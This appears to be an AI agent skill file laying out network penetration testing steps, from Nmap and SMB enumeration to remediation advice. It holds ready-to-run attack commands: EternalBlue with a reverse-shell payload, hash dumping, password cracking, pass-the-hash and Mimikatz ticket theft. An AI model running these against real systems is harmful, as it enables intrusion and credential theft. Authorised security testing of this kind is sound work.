---
name: network-penetration-testing
description: Professional skills and methodology for network penetration testing
version: 1.0.0
---

# Network Penetration Testing

## Overview

Network penetration testing assesses infrastructure security. This skill provides methods, tools, and best practices.

## Testing Scope

### 1. Information Gathering

**Items to check:**
- Network topology
- Host discovery
- Port scanning
- Service identification

### 2. Vulnerability Scanning

**Items to check:**
- System vulnerabilities
- Service vulnerabilities
- Misconfigurations
- Weak passwords

### 3. Exploitation

**Items to check:**
- Remote code execution
- Privilege escalation
- Lateral movement
- Persistence

## Information Gathering

### Network Scanning

**Using Nmap:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -p- 192.168.1.100

# Service identification
nmap -sV -sC 192.168.1.100

# Operating system identification
nmap -O 192.168.1.100

# Full scan
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Using Masscan:**
```bash
# Fast port scan
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service Enumeration

**SMB enumeration:**
```bash
# Enumerate SMB shares
smbclient -L //192.168.1.100 -N

# Enumerate SMB users
enum4linux -U 192.168.1.100

# Use Nmap scripts
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC enumeration:**
```bash
# Enumerate RPC services
rpcclient -U "" -N 192.168.1.100

# Use Nmap scripts
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumeration:**
```bash
# SNMP scan
snmpwalk -v2c -c public 192.168.1.100

# Use onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability Scanning

### Using Nessus

```bash
# Start Nessus
# Open the web interface
# Create a scan task
# Analyze scan results
```

### Using OpenVAS

```bash
# Start OpenVAS
gvm-setup

# Open the web interface
# Create a scan task
# Analyze scan results
```

### Using Nmap Scripts

```bash
# Vulnerability scan
nmap --script vuln 192.168.1.100

# Scan for a specific vulnerability
nmap --script smb-vuln-ms17-010 192.168.1.100

# All scripts
nmap --script all 192.168.1.100
```

## Exploitation

### Metasploit

**Basic usage:**
```bash
# Start Metasploit
msfconsole

# Search for vulnerabilities
search ms17-010

# Select a module
use exploit/windows/smb/ms17_010_eternalblue

# Set parameters
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Execute
exploit
```

**Post-exploitation:**
```bash
# Retrieve system information
sysinfo

# Obtain privileges
getsystem

# Migrate the process
migrate <pid>

# Retrieve hashes
hashdump

# Retrieve passwords
run post/windows/gather/smart_hashdump
```

### Common Exploits

**EternalBlue：**
```bash
# Use Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# Use standalone tools
python eternalblue.py 192.168.1.100
```

**BlueKeep：**
```bash
# Use Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost：**
```bash
# Use standalone tools
python smbghost.py 192.168.1.100
```

## Lateral Movement

### Password Cracking

**Using Hashcat:**
```bash
# Crack NTLM hashes
hashcat -m 1000 hashes.txt wordlist.txt

# Crack LM hashes
hashcat -m 3000 hashes.txt wordlist.txt

# Use rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Using John:**
```bash
# Crack hashes
john hashes.txt

# Use a wordlist
john --wordlist=wordlist.txt hashes.txt

# Use rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Using Impacket:**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Pass-the-Ticket

**Using Mimikatz:**
```bash
# Extract tickets
sekurlsa::tickets /export

# Inject tickets
kerberos::ptt ticket.kirbi
```

**Using Rubeus:**
```bash
# Request tickets
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# Inject tickets
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Tools

### Nmap

```bash
# Full scan
nmap -sS -sV -sC -O -p- -T4 target

# Stealth scan
nmap -sS -T2 -f -D RND:10 target

# UDP scan
nmap -sU -p- target
```

### Metasploit

```bash
# Start the framework
msfconsole

# Initialize the database
msfdb init

# Import scan results
db_import nmap.xml

# View hosts
hosts

# View services
services
```

### Burp Suite

**Network scanning:**
1. Configure the proxy
2. Browse the target network
3. Analyze traffic
4. Run active scans

## Testing Checklist

### Information Gathering
- [ ] Discover network topology
- [ ] Discover hosts
- [ ] Scan ports
- [ ] Identify services
- [ ] Identify operating systems

### Vulnerability Scanning
- [ ] Scan system vulnerabilities
- [ ] Scan service vulnerabilities
- [ ] Check for misconfigurations
- [ ] Check for weak passwords

### Exploitation
- [ ] Remote code execution
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Common Security Issues

### 1. Unpatched Systems

**Problem:**
- Systems not updated promptly
- Known vulnerabilities present
- Improper patch management

**Remediation:**
- Install patches promptly
- Establish patch management procedures
- Apply regular security updates

### 2. Weak Passwords

**Problem:**
- Default passwords
- Simple passwords
- Password reuse

**Remediation:**
- Enforce strong password policies
- Enable multi-factor authentication
- Change passwords regularly

### 3. Open Ports

**Problem:**
- Unnecessary open ports
- Exposed services
- Firewall misconfiguration

**Remediation:**
- Close unnecessary ports
- Enforce firewall rules
- Use VPN access

### 4. Misconfiguration

**Problem:**
- Default configuration
- Excessive privileges
- Improper service configuration

**Remediation:**
- Secure configuration baselines
- Principle of least privilege
- Regular configuration reviews

## Best Practices

### 1. Information Gathering

- Comprehensive scanning
- Verification with multiple tools
- Record findings
- Analyze results

### 2. Exploitation

- Authorized testing
- Minimal impact
- Record actions
- Prompt cleanup

### 3. Report Writing

- Detailed records
- Risk ratings
- Remediation guidance
- Verification steps

## Considerations

- Test only in authorized environments
- Avoid disrupting production systems
- Follow applicable laws and regulations
- Protect testing data